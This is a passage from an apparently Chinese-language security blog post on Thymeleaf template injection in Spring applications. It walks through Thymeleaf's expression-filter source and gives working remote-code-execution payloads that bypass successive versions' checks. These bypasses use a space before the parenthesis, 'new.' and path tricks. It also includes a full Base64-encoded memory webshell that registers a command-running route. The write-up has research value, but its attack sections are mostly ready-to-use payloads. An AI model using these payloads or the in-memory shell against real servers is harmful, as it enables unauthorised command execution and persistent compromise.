写成了下面的样子，就依然会产生漏洞。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/demo3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">demo3</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> &#123;</span><br><span class="line">System.out.println(data);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;demo3/&quot;</span> + data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@GetMapping(&quot;/demo4/&#123;data&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">demo4</span><span class="params">(<span class="meta">@PathVariable</span> String data)</span> &#123;</span><br><span class="line">System.out.println(data);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;demo4/&quot;</span> + data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时如果 <code>poc</code> 写成下面的样子，就可以绕过 <code>checkViewNameNotInRequest()</code> 的检查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/demo3?data=__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br><span class="line">/demo4/;/__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240320011043.png"></p><p><img src="/imgs/Pasted%20image%2020240320023703.png"></p><p><code>demo3</code> 的 <code>poc</code> 好理解，<code>demo4</code> 的 <code>poc</code> 我们在调试的时候发现 <code>requestURI</code> 中的 <code>;</code> 在 <code>viewName</code> 被去掉了，这是因为 <code>Tomcat</code> 的 <code>URL</code> 解析特性。参考 <code>Tomcat</code> 的 <code>url</code> 解析特性 ，具体源码就不仔细分析了。</p><p>但是我们发现上面的 <code>poc</code> 虽然绕过了 <code>checkViewNameNotInRequest()</code> ，但是还是打不通。这是因为后面还有前面提到了的 <code>SpringStandardExpressionUtils</code> 的检查。</p><p>检查在 <code>SPELVariableExpressionEvaluator#getExpression()</code> 中，这里 <code>expContext</code> 是禁止 <code>SpEL</code> 表达式中 <code>new</code> 对象或者调用类的静态方法的。</p><p><img src="/imgs/Pasted%20image%2020240320011818.png"></p><p>而对 <code>SpEL</code> 表达式的检查在 <code>SpringStandardExpressionUtils.containsSpELInstantiationOrStatic()</code> 方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">containsSpELInstantiationOrStatic</span><span class="params">(String expression)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">explen</span> <span class="operator">=</span> expression.length();</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> explen;</span><br><span class="line"><span class="type">int</span> <span class="variable">ni</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">si</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n-- != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> expression.charAt(n);</span><br><span class="line"><span class="keyword">if</span> (ni &gt;= NEW_LEN || c != NEW_ARRAY[ni] || ni &lt;= <span class="number">0</span> &amp;&amp; (n + <span class="number">1</span> &gt;= explen || !Character.isWhitespace(expression.charAt(n + <span class="number">1</span>)))) &#123;</span><br><span class="line"><span class="keyword">if</span> (ni &gt; <span class="number">0</span>) &#123;</span><br><span class="line">n += ni;</span><br><span class="line">ni = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (si &lt; n) &#123;</span><br><span class="line">si = -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ni = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">si = n;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (si &gt; n &amp;&amp; c == <span class="string">&#x27;(&#x27;</span> &amp;&amp; n - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; expression.charAt(n - <span class="number">1</span>) == <span class="string">&#x27;T&#x27;</span> &amp;&amp; (n - <span class="number">1</span> == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">2</span>)))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (si &gt; n &amp;&amp; !Character.isJavaIdentifierPart(c) &amp;&amp; c != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">si = -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">++ni;</span><br><span class="line"><span class="keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">1</span>)))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其主要逻辑是首先倒序检测是否包含 <code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行。</p><p>因此要绕过这个函数，只要满足三点：  </p><ol><li>表达式中不能含有关键字<code>new</code>  </li><li>在<code>(</code>的左边的字符不能是<code>T</code>  </li><li>不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</li></ol><p>这里在 <code>T</code> 和 <code>(</code> 之间加上空格 <code>%20</code> 就可以绕过，其余还有很多字符都可以。例如换行符 <code>%0a</code> ，制表符 <code>%09</code> 。</p><p>绕过这点就可以成功通过 <code>EL</code> 表达式来 <code>RCE</code> 了。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>最终的 <code>POC</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/demo3?data=__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br><span class="line">/demo4/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br><span class="line">/demo4;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br><span class="line">/demo4//__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br></pre></td></tr></table></figure><h2 id="高版本的修复"><a href="#高版本的修复" class="headerlink" title="高版本的修复"></a>高版本的修复</h2><p>在 <code>Thymeleaf 3.0.12</code> 版本之后加强了 <code>checkViewNameNotInRequest()</code> 方法，要求 <code>URI</code> 的值和其 <code>get</code> 参数在 <code>StringUtils.pack()</code> 之后不能出现 <code>$</code> ，<code>*</code> ，<code>#</code> ，<code>@</code> ，<code>~</code> 紧跟 <code>&#123;</code> 的情况。</p><p><img src="/imgs/Pasted%20image%2020240320024942.png"></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="当controller不return的时候"><a href="#当controller不return的时候" class="headerlink" title="当controller不return的时候"></a>当controller不return的时候</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>环境基于 <code>Thymeleaf 3.0.12</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/demo5&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">demo5</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> &#123;</span><br><span class="line">System.out.println(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@GetMapping(&quot;/demo6/&#123;data&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">demo6</span><span class="params">(<span class="meta">@PathVariable</span> String data)</span> &#123;</span><br><span class="line">System.out.println(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码可以利用吗？</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>我们这里拿原来 <code>3.0.12</code> 的 <code>poc</code> 来打。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/demo5?data=__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240320013748.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/demo6/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240320013853.png"></p><p>我们发现此时第一种情况会把 <code>URI</code> 当作视图名，第二种情况视图名末尾的 <code>::</code> 消失了。这里直接先给出结论：第一种情况暂时无解，第二种情况有办法解决。</p><p>我们可以分析一下第二种情况 <code>viewName</code> 是怎么获取的。</p><p><img src="/imgs/Pasted%20image%2020240320021250.png"></p><p>不难调试到上面的位置，发现 <code>viewName</code> 在这里会去掉倒数第一个 <code>.</code> 后面的内容，也就是去掉后缀名的操作，为了防止 <code>.exec(&quot;calc&quot;)%7D__::</code> 被去掉，我们不难想到可以在末尾再加一个 <code>.</code> 后缀。</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/demo6/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::.</span><br></pre></td></tr></table></figure><h3 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h3><p>环境基于 <code>Thymeleaf 3.0.12</code> 。</p><blockquote><p>注意：这里我们借助了 <code>org.springframework.util.Base64Utils.encodeToUrlSafeString()</code> 这个方法来避免出现 <code>Base64</code> 编码后出现 <code>/</code> 字符导致 <code>Tomcat</code> 将其识别为路由的情况。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/demo4/;/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x</span><br></pre></td></tr></table></figure><p>然后访问 <code>/asd?cmd=whoami</code> 。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://forum.butian.net/share/1922">https://forum.butian.net/share/1922</a><br><a href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a><br><a href="https://xz.aliyun.com/t/11688">https://xz.aliyun.com/t/11688</a></p><h1 id="漏洞二：控制模板内容"><a href="#漏洞二：控制模板内容" class="headerlink" title="漏洞二：控制模板内容"></a>漏洞二：控制模板内容</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p><code>Thymeleaf</code> 中的预处理表达式可以处理 <code>SpEL</code> 表达式，从而如果我们可以控制 <code>Thymeleaf</code> 渲染的模板内容，就可以执行 <code>java</code> 代码。</p><h2 id="3-0-11及以下版本利用"><a href="#3-0-11及以下版本利用" class="headerlink" title="3.0.11及以下版本利用"></a>3.0.11及以下版本利用</h2><p>经过了前面的分析沉淀，这里我们可以知道， <code>3.0.11</code> 版本及之前没有对 <code>SpEL</code> 表达式的解析有任何约束，因此我们直接在预处理表达式中注入命令执行就可以了。</p><p><code>poc</code> 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;__$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;__&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-0-12版本利用"><a href="#3-0-12版本利用" class="headerlink" title="3.0.12版本利用"></a>3.0.12版本利用</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>在 <code>3.0.12</code> 版本，在解析模板中的 <code>SpEL</code> 表达式的时候，在 <code>SpringStandardExpressionUtils.containsSpELInstantiationOrStaticOrParam()</code> 中要求下面三点：</p><ol><li>表达式中不能含有关键字<code>new</code>  </li><li>在<code>(</code>的左边的字符不能是<code>T</code>  </li><li>不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</li></ol><p>这里在 <code>T</code> 和 <code>(</code> 之间加上空格 <code>%20</code> 就可以绕过，其余还有很多字符都可以。例如换行符 <code>%0a</code> ，制表符 <code>%09</code> 。</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p><code>poc</code> 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;__$&#123;T (java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;__&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-0-15版本利用"><a href="#3-0-15版本利用" class="headerlink" title="3.0.15版本利用"></a>3.0.15版本利用</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>在 <code>3.0.15</code> 版本（ <code>3.0.x</code> 的最后一个版本）， <code>Thymeleaf</code> 加强了 <code>SpringStandardExpressionUtils.containsSpELInstantiationOrStaticOrParam()</code> 方法。但是这个方法还是可以被绕过。</p><p>这个方法和 <code>3.0.12</code> 版本的逻辑差不多，不过这里加强了 <code>T</code> 和 <code>(</code> 之间空格的检测（具体逻辑在 <code>SpringStandardExpressionUtils.isPreviousStaticMarker()</code> 方法中），导致前面的空格绕过在这里行不通。</p><blockquote><p>但是这里有办法绕过第一个限制。这个方法对 <code>new</code> 关键字的检测并非单纯的看 <code>new</code> 字符串是不是 <code>expression</code> 的字串，而是限制 <code>new</code> 字符串不能在 <code>expression</code> 的开头或者 <code>new</code> 字符串的前一个字符为非特殊字符，并且 <code>new</code> 的下一个字符如果不是空格就可以过这里的检测。<br>如果熟悉 <code>Spel</code> 表达式，会发现 <code>new</code> 后面如果紧跟的是 <code>.</code> 也可以解析成功，这样我们就可以通过在 <code>new</code> 后面加一个 <code>.</code> 来绕过这里对 <code>new</code> 关键字的限制。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240320163058.png"></p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>绕过 <code>poc</code> 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;__$&#123;new.java.lang.ProcessBuilder(&#x27;calc&#x27;).start()&#125;__&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者下面这样也是可以解析成功的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;__$&#123;new.java..lang.ProcessBuilder(&#x27;calc&#x27;).start()&#125;__&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-1-1版本利用"><a href="#3-1-1版本利用" class="headerlink" title="3.1.1版本利用"></a>3.1.1版本利用</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>在 <code>3.1.x</code> 版本， <code>Thymeleaf</code> 加强了黑名单机制，禁止模板渲染中解析 <code>SpEL</code> 表达式的时候加载某些类。具体逻辑在 <code>ExpressionUtils.isTypeAllowed()</code> 方法中。</p><p>低版本 <code>3.0.15</code> 的黑名单：</p><p><img src="/imgs/Pasted%20image%2020240320040212.png"></p><p>高版本 <code>3.1.1</code> 的黑名单：</p><p><img src="/imgs/Pasted%20image%2020240320170632.png"></p><p><img src="/imgs/Pasted%20image%2020240320170714.png"></p><p>这里我们绕过黑名单的思路有两个：</p><ol><li>寻找在白名单中有命令执行方法的类，从而直接命令执行。</li><li>寻找在白名单中提供了反射调用其它类的方法的类，从而用这个类来反射调用一些黑名单中可以命令执行的方法，由于这里是反射调用，所以 